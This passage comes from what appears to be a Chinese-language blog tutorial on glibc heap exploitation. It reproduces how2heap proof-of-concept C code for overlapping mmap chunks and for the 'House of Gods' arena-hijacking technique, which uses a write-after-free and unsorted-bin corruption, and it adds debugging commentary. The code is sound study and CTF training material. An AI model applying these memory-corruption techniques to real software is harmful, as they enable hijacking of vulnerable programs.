<span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This next call to free is actually just going to call munmap on the pointer we are passing it.</span></span><br><span class="line"><span class="comment">	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	With normal frees the data is still writable and readable (which creates a use after free on </span></span><br><span class="line"><span class="comment">	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span></span><br><span class="line"><span class="comment">	data is read or written to, the program crashes.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Because of this added restriction, the main goal is to get the memory back from the system</span></span><br><span class="line"><span class="comment">	to have two pointers assigned to the same location.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3); </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Would crash, if on the following:</span></span><br><span class="line"><span class="comment">	mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">	This is because the memory would not be allocated to the current program.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Allocate a very large chunk with malloc. This needs to be larger than </span></span><br><span class="line"><span class="comment">	the previously freed chunk because the mmapthreshold has increased to 0x202000.</span></span><br><span class="line"><span class="comment">	If the allocation is not larger than the size of the largest freed mmap </span></span><br><span class="line"><span class="comment">	chunk then the allocation will happen in the normal section of heap memory.</span></span><br><span class="line"><span class="comment">	*/</span>	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Gets the distance between the two pointers.</span></span><br><span class="line">	<span class="type">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;</span>, distance);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Set the value of the overlapped chunk.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting the value of the overlapped chunk\n&quot;</span>);</span><br><span class="line">	overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">assert</span>(mmap_chunk_2[<span class="number">0</span>] == overlapping_chunk[distance]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-17"><a href="#调试-17" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014110953593.png"
                      alt="image-20231014110953593"
                ></p>
<p>首先申请三个 <code>0x100000</code> 大小的 <code>mmap_chunk</code>，分别为 <code>top_ptr</code>，<code>mmap_chunk_2</code>，<code>mmap_chunk_3</code>，第一个 <code>top_ptr</code> 位于 <code>libc.so</code> 上方。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111020031.png"
                      alt="image-20231014111020031"
                ></p>
<p>接下来将 <code>mmap_chunk_3</code> 的 <code>size</code> 改为 <code>202002</code>，因为 <code>mmap_chunk_3</code> 位于 <code>mmap_chunk_2</code> 低地址处，所以 <code>mmap_chunk_3</code> 现在的 <code>size</code> 大小包含了 <code>mmap_chunk_2</code> ，与 <code>2</code> 取与运算是为了将 <code>IS_MMAP</code> 位置为 <code>1</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111503915.png"
                      alt="image-20231014111503915"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111605033.png"
                      alt="image-20231014111605033"
                ></p>
<p>接下来 <code>free(mmap_chunk_3)</code> 。再次申请 <code>0x300000</code> 大小的 <code>overlapping_chunk</code>，<code>mmap_chunk_2</code> 被包含在了 <code>overlapping_chunk</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111828047.png"
                      alt="image-20231014111828047"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111851907.png"
                      alt="image-20231014111851907"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111909499.png"
                      alt="image-20231014111909499"
                ></p>
<p>我们可以通过 <code>overlapping_chunk</code> 去修改 <code>mmap_chunk_2</code> 的内容。</p>
<h2 id="house-of-gods"><a href="#house-of-gods" class="headerlink" title="house_of_gods"></a>house_of_gods</h2><p><code>glibc &lt; 2.27</code>，这是一个比较有趣的利用手法。</p>
<h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* House of Gods PoC */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Welcome to the House of Gods...</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * House of Gods is an arena hijacking technique for glibc &lt; 2.27. It supplies</span></span><br><span class="line"><span class="comment"> * the attacker with an arbitrary write against the thread_arena symbol of</span></span><br><span class="line"><span class="comment"> * the main thread. This can be used to replace the main_arena with a</span></span><br><span class="line"><span class="comment"> * carefully crafted fake arena. The exploit was tested against</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     - glibc-2.23</span></span><br><span class="line"><span class="comment"> *     - glibc-2.24</span></span><br><span class="line"><span class="comment"> *     - glibc-2.25</span></span><br><span class="line"><span class="comment"> *     - glibc-2.26</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Following requirements are mandatory</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     - 8 allocs of arbitrary size to hijack the arena (+2 for ACE)</span></span><br><span class="line"><span class="comment"> *     - control over first 5 quadwords of a chunk&#x27;s userdata</span></span><br><span class="line"><span class="comment"> *     - a single write-after-free bug on an unsorted chunk</span></span><br><span class="line"><span class="comment"> *     - heap address leak + libc address leak</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This PoC demonstrates how to leverage the House of Gods in order to hijack</span></span><br><span class="line"><span class="comment"> * the thread_arena. But it wont explain how to escalate further to</span></span><br><span class="line"><span class="comment"> * arbitrary code execution, since this step is trivial once the whole arena</span></span><br><span class="line"><span class="comment"> * is under control.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Also note, that the how2heap PoC might use more allocations than</span></span><br><span class="line"><span class="comment"> * previously stated. This is intentional and has educational purposes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If you want to read the full technical description of this technique, going</span></span><br><span class="line"><span class="comment"> * from zero to arbitrary code execution within only 10 to 11 allocations, here</span></span><br><span class="line"><span class="comment"> * is the original document I&#x27;ve written</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * I recommend reading this document while experimenting with</span></span><br><span class="line"><span class="comment"> * the how2heap PoC.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Besides that, this technique abuses a minor bug in glibc, which I have</span></span><br><span class="line"><span class="comment"> * already submitted to bugzilla at</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     https://sourceware.org/bugzilla/show_bug.cgi?id=29709</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * AUTHOR: David Milosevic (milo)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &lt;--- Exploit PoC ---&gt; */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=================\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;= House of Gods =\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== Abstract ===\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The core of this technique is to allocate a fakechunk overlapping\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the binmap field within the main_arena. This fakechunk is located at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x850. Its sizefield can be crafted by carefully binning chunks\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;into smallbins or largebins. The binmap-chunk is then being linked into\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the unsorted bin via a write-after-free bug in order to allocate it back\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;as an exact fit. One can now tamper with the main_arena.next pointer at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x868 and inject the address of a fake arena. A final unsorted bin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;attack corrupts the narenas variable with a very large value. From there, only\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;two more allocation requests for at least 0xffffffffffffffc0 bytes of memory\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;are needed to trigger two consecutive calls to the reused_arena() function,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which in turn traverses the corrupted arena-list and sets thread_arena to the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;address stored in main_arena.next - the address of the fake arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;=== PoC ===\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay, so let us start by allocating some chunks...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate a smallchunk, for example a 0x90-chunk.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate the first fastchunk. We will use</span></span><br><span class="line"><span class="comment">     * a 0x20-chunk for this purpose.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAST20 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * allocate a second fastchunk. This time</span></span><br><span class="line"><span class="comment">     * a 0x40-chunk.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *FAST40 = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our 0x90-sized smallchunk. We will bin this chunk to forge a\n&quot;</span>, SMALLCHUNK);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake sizefield for our binmap-chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our first fastchunk. Its size is 0x20.\n\n&quot;</span>, FAST20);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p is our second fastchunk with a size of 0x40. The usecase of\n&quot;</span>, FAST40);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;both fastchunks will be explained later in this PoC.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can move our smallchunk to the unsorted bin by simply free&#x27;ing it...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * put SMALLCHUNK into the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this is a great opportunity to simulate a</span></span><br><span class="line"><span class="comment">     * libc leak. We just read the address of the</span></span><br><span class="line"><span class="comment">     * unsorted bin and save it for later.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">uint64_t</span> leak = *((<span class="type">uint64_t</span>*) SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And now we need to make a request for a chunk which can not be serviced by\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;our recently free&#x27;d smallchunk. Thus, we will make a request for a\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0xa0-sized chunk - let us call this chunk INTM (intermediate).\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * following allocation will trigger a binning</span></span><br><span class="line"><span class="comment">     * process within the unsorted bin and move</span></span><br><span class="line"><span class="comment">     * SMALLCHUNK to the 0x90-smallbin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our smallchunk should be now in the 0x90-smallbin. This process also triggered\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the mark_bin(m, i) macro within the malloc source code. If you inspect the\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main_arena&#x27;s binmap located at offset 0x855, you will notice that the initial\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value of the binmap changed from 0x0 to 0x200 - which can be used as a valid\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sizefield to bypass the unsorted bin checks.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We would also need a valid bk pointer in order to bypass the partial unlinking\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;procedure within the unsorted bin. But luckily, the main_arena.next pointer at\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;offset 0x868 points initially to the start of the main_arena itself. This fact\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;makes it possible to pass the partial unlinking without segfaulting.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So now that we have crafted our binmap-chunk, it is time to allocate it\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;from the unsorted bin. For that, we will abuse a write-after-free bug\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;on an unsorted chunk. Let us start...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First, allocate another smallchunk...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * recycle our previously binned smallchunk.</span></span><br><span class="line"><span class="comment">     * Note that, it is not neccessary to recycle this</span></span><br><span class="line"><span class="comment">     * chunk. I am doing it only to keep the heap layout</span></span><br><span class="line"><span class="comment">     * small and compact.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...and now move our new chunk to the unsorted bin...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * put SMALLCHUNK into the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;...in order to tamper with the free&#x27;d chunk&#x27;s bk pointer.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * bug: a single write-after-free bug on an</span></span><br><span class="line"><span class="comment">     * unsorted chunk is enough to initiate the</span></span><br><span class="line"><span class="comment">     * House of Gods technique.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (SMALLCHUNK + <span class="number">0x8</span>)) = leak + <span class="number">0x7f8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Great. We have redirected the unsorted bin to our binmap-chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;But we also have corrupted the bin. Let&#x27;s fix this, by redirecting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a second time.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The next chunk (head-&gt;bk-&gt;bk-&gt;bk) in the unsorted bin is located at the start\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;of the main-arena. We will abuse this fact and free a 0x20-chunk and a 0x40-chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in order to forge a valid sizefield and bk pointer. We will also let the 0x40-chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;point to another allocated chunk (INTM) by writing to its bk pointer before\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;actually free&#x27;ing it.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * before free&#x27;ing those chunks, let us write</span></span><br><span class="line"><span class="comment">     * the address of another chunk to the currently</span></span><br><span class="line"><span class="comment">     * unused bk pointer of FAST40. We can reuse</span></span><br><span class="line"><span class="comment">     * the previously requested INTM chunk for that.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Free&#x27;ing FAST40 wont reset the bk pointer, thus</span></span><br><span class="line"><span class="comment">     * we can let it point to an allocated chunk while</span></span><br><span class="line"><span class="comment">     * having it stored in one of the fastbins.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The reason behind this, is the simple fact that</span></span><br><span class="line"><span class="comment">     * we will need to perform an unsorted bin attack later.</span></span><br><span class="line"><span class="comment">     * And we can not request a 0x40-chunk to trigger the</span></span><br><span class="line"><span class="comment">     * partial unlinking, since a 0x40 request will be serviced</span></span><br><span class="line"><span class="comment">     * from the fastbins instead of the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    *((<span class="type">uint64_t</span>*) (FAST40 + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * and now free the 0x20-chunk in order to forge a sizefield.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(FAST20);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * and the 0x40-chunk in order to forge a bk pointer.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="built_in">free</span>(FAST40);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay. The unsorted bin should now look like this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; SMALLCHUNK -&gt; binmap -&gt; main-arena -&gt; FAST40 -&gt; INTM\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk            bk        bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The binmap attack is nearly done. The only thing left to do, is\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;to make a request for a size that matches the binmap-chunk&#x27;s sizefield.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * all the hard work finally pays off...we can</span></span><br><span class="line"><span class="comment">     * now allocate the binmap-chunk from the unsorted bin.</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="type">void</span> *BINMAP = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After allocating the binmap-chunk, the unsorted bin should look similar to this\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;head -&gt; main-arena -&gt; FAST40 -&gt; INTM\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;     bk            bk        bk\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And that is a binmap attack. We&#x27;ve successfully gained control over a small\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;number of fields within the main-arena. Two of them are crucial for\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the House of Gods technique\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; main_arena.next\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; main_arena.system_mem\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;By tampering with the main_arena.next field, we can manipulate the arena&#x27;s\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;linked list and insert the address of a fake arena. Once this is done,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;we can trigger two calls to malloc&#x27;s reused_arena() function.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The purpose of the reused_arena() function is to return a non-corrupted,\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;non-locked arena from the arena linked list in case that the current\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arena could not handle previous allocation request.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The first call to reused_arena() will traverse the linked list and return\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a pointer to the current main-arena.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The second call to reused_arena() will traverse the linked list and return\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a pointer to the previously injected fake arena (main_arena.next).\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We can reach the reused_arena() if we meet following conditions\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    - exceeding the total amount of arenas a process can have.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      malloc keeps track by using the narenas variable as\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      an arena counter. If this counter exceeds the limit (narenas_limit),\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      it will start to reuse existing arenas from the arena list instead\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      of creating new ones. Luckily, we can set narenas to a very large\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      value by performing an unsorted bin attack against it.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    - force the malloc algorithm to ditch the current arena.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      When malloc notices a failure it will start a second allocation\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      attempt with a different arena. We can mimic an allocation failure by\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;      simply requesting too much memory i.e. 0xffffffffffffffc0 and greater.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let us start with the unsorted bin attack. We load the address of narenas\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;minus 0x10 into the bk pointer of the currently allocated INTM chunk...\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * set INTM&#x27;s bk to narenas-0x10. This will</span></span><br><span class="line"><span 